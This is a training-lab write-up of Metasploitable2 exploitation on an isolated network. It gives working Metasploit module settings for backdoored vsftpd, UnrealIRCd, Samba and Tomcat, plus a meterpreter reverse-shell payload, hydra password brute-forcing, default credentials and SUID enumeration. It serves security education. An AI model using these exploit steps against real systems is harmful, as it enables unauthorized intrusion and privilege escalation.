🧪 Day 1 – Metasploitable2 Exploitation Lab
🎯 Target Environment

Victim VM: Metasploitable2 (192.168.56.102)

Attacker VM: Kali Linux (192.168.56.101)

Network: Host-only (isolated lab, no internet)

📌 Day 1 Plan

Recon → Enumeration → Exploitation → Post-Exploitation → Cleanup

Services in scope today:

vsftpd (21) – FTP backdoor

UnrealIRCd (6667) – IRC backdoor

Tomcat (8080/8180) – Weak creds → WAR upload

distcc (3632) – Remote command execution

SSH (22) – Weak/default credentials

Telnet (23) – Plaintext login

Samba/SMB (139,445) – Share enumeration + RCE

VNC (5900) – Weak password

PostgreSQL (5432) – Weak DB creds

🔎 Recon & Enumeration

Example general scan (Kali):

sudo nmap -sS -sV -O -Pn 192.168.56.102 -oA scans/full


-sS: SYN scan

-sV: Version detection

-O: OS detection

-Pn: No ping (treat host as alive)

-oA scans/full: Save in all formats

⚡ Exploitation Walkthroughs
1. FTP – vsftpd 2.3.4

Vuln: Backdoored version, username :) triggers shell on port 6200.

sudo msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.102
set RPORT 21
exploit


Post-exploit:

whoami
id
pwd
ls -la

2. IRC – UnrealIRCd 3.2.8.1

Vuln: Supply-chain backdoor, remote RCE without authentication.

sudo msfconsole
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.56.102
set RPORT 6667
exploit

3. Tomcat – 8080/8180

Vuln: Default creds (tomcat:tomcat) → WAR file deploy.

sudo msfconsole
use exploit/multi/http/tomcat_mgr_deploy
set RHOSTS 192.168.56.102
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 4444
exploit

4. distcc – 3632

Vuln: Unauthenticated remote command execution.

sudo nmap -p3632 --script distcc-exec 192.168.56.102


or in Metasploit:

use exploit/unix/misc/distcc_exec
set RHOSTS 192.168.56.102
set RPORT 3632
exploit

5. SSH – 22

Vuln: Weak credentials.

ssh msfadmin@192.168.56.102
# password: msfadmin


Optional brute force:

hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.102

6. Telnet – 23

Vuln: Plaintext credentials.

telnet 192.168.56.102 23
# login: msfadmin / msfadmin

7. Samba – 139/445

Vuln: RCE (CVE-2007-2447), share misconfigurations.

enum4linux -a 192.168.56.102 > scans/enum4linux.txt
smbclient -L //192.168.56.102/ -N


Exploit in Metasploit:

use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.102
exploit

8. VNC – 5900

Vuln: Weak/no password.

vncviewer 192.168.56.102:5900
# try password: password

9. PostgreSQL – 5432

Vuln: Weak DB creds.

psql -h 192.168.56.102 -U postgres
# try password: postgres


Metasploit module:

use exploit/multi/postgres/postgres_payload
set RHOSTS 192.168.56.102
exploit

🔍 Post-Exploitation Enumeration

Once a shell is gained, run:

whoami      # current user
id          # UID/GID info
pwd         # working directory
ls -la      # detailed directory listing
sudo -l     # check sudo permissions
find / -perm -4000 -type f 2>/dev/null   # SUID binaries


Purpose: identify privilege escalation opportunities.

📝 Knowledge Check (Q&A)

Q: Why is Telnet insecure?
A: Sends credentials in plaintext, easy to sniff.

Q: What’s unique about UnrealIRCd’s backdoor?
A: It was a supply-chain compromise; attackers trojaned the official tarball.

Q: How does Tomcat exploitation usually work?
A: Weak/default creds → access Manager App → upload malicious WAR file.

Q: What are SUID binaries and why check them?
A: Executables with the set-user-ID bit set; if misconfigured, they allow privilege escalation.

🧹 Cleanup

Close sessions (sessions -k in Metasploit).

Revert VM snapshot (e.g., before-telnet).

Save all notes/scans to ~/labs/metasploitable/notes/.

✅ End of Day 1:

Understood service-specific vulns in Metasploitable2.

Practiced exploitation via Metasploit & manual tools.

Learned basic post-exploitation enumeration.

Prepared Q&A for explaining vulnerabilities.
